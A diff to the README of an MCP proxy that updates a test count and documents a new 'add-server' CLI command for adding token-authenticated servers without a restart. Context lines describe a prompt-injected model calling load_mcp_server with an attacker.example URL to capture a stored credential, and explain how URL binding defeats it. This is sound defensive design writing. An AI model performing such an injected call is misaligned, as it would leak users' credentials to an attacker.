@@ -64,7 +64,7 @@ The base proxy is working: dynamic server loading, RAG-based tool retrieval, an 
 
 Beyond that base, an in-process **policy-bundle engine** enforces signed-evidence policies on the call path: a policy (compiled to OPA/Rego-WASM, or authored directly in CEL) evaluates a closed input assembled from the call's arguments, deployment config, and resolved evidence — a Verifiable Credential, a WebAuthn passkey assertion, a merchant's raw signature over the exact bytes it signed — each verified field-by-field against the actual call, never taken on the LLM's word. The engine is deliberately plural: `manifest.json`/`fetchplan.json`/the human-facing guidance layer are the same regardless of which engine evaluates the policy, and both a Rego and a CEL backend ship as proof. See [`project-overview.md`](project-overview.md) for the architecture, module by module.
 
-The line from here to [Policy as Code, Policy as Type (Fuchs, 2025)](https://arxiv.org/abs/2506.01446) — which treats a policy as a dependent type whose properties can be mathematically proven rather than just tested — is now concrete rather than aspirational: the bundle format supports a policy derived that way, without the proxy needing to know or care. The core package's suite is 340 tests; the two example packages add 133 and 51.
+The line from here to [Policy as Code, Policy as Type (Fuchs, 2025)](https://arxiv.org/abs/2506.01446) — which treats a policy as a dependent type whose properties can be mathematically proven rather than just tested — is now concrete rather than aspirational: the bundle format supports a policy derived that way, without the proxy needing to know or care. The core package's suite is 365 tests; the two example packages add 133 and 51.
 
 ## Threat Model
 
@@ -202,6 +202,21 @@ Format: one `server_name=value` pair per line, `#` for comments, surrounding quo
 **Moving the tokens file outside the project.** If your setup includes a filesystem MCP server (or any other tool) that can read paths inside the project directory, the default `tokens` location is reachable by the agent. To keep credentials out of reach, set `EXTENSIBLE_MCP_TOKENS_FILE` to a path the agent can't see — e.g. `~/.secrets/extensible-mcp-tokens`. The variable can be set in the proxy's environment or in the `.env` file next to the config; relative paths are resolved relative to the config directory, and `~` is expanded. If the variable is set but the file doesn't exist, the proxy refuses to start. Without the variable, behavior is unchanged: the proxy looks for `tokens` next to the config and runs without one if it isn't there. The resolved path is logged at startup so you can confirm which file is in use.
 
 **Tokens are only sent to URLs you configured.** A token is keyed by server name, but the URL a connection goes to is chosen by whoever opened it — and for a runtime `load_mcp_server`, that is the LLM. So a stored token is presented only when the connection's URL matches the one named for that server in the config file. A prompt-injected model calling `load_mcp_server("notion", "https://attacker.example/mcp")` gets no credential: the connection is attempted anonymously and, against a server that requires auth, simply fails. This means a server that needs a token must be in your config, not discovered at runtime.
+
+**Adding an authenticated server without restarting.** That rule would otherwise make "get a token, start using it" a restart, so the proxy ships an operator command:
+
+```bash
+# --token-stdin keeps the secret out of your shell history and the process list
+echo -n "$TOKEN" | extensible-mcp add-server --name notion --url https://notion.example/mcp --token-stdin
+```
+
+It connects to the URL as an MCP client with that token and lists its tools, and *only if that works* writes the server into your config and the token into the tokens file (`0600`), then sends `SIGHUP` to a proxy already running against that config so it connects and indexes the new tools in place. If no proxy is running, the files are still written and the next start picks them up.
+
+Verification matches the runtime exactly, including not following redirects — so a URL that redirects is reported here, with the URL to use instead, rather than passing the check and failing later at the proxy.
+
+It is a CLI command rather than an argument on `load_mcp_server` on purpose. The flaw it works around was the model *referencing a credential it had never seen*; passing the token in inverts that, so only a caller who already holds it can use it, and the model holds none. Putting a `token` parameter on the meta-tool would be safe from exfiltration for the same reason, but it shares the surface the model drives, and any user who pasted a token into a chat to make it work would break the rule that tokens never transit the conversation.
+
+An existing server name is never re-pointed: repointing a name at another host is the substitution the URL binding exists to prevent, so the command refuses and tells you to edit the config by hand if you really mean it.
 
 Tokens are sent as `Authorization: Bearer <token>` headers. The file is read fresh on every connection, so you can rotate credentials without restarting the proxy — overwrite the line, save, and the next request picks up the new value.
 
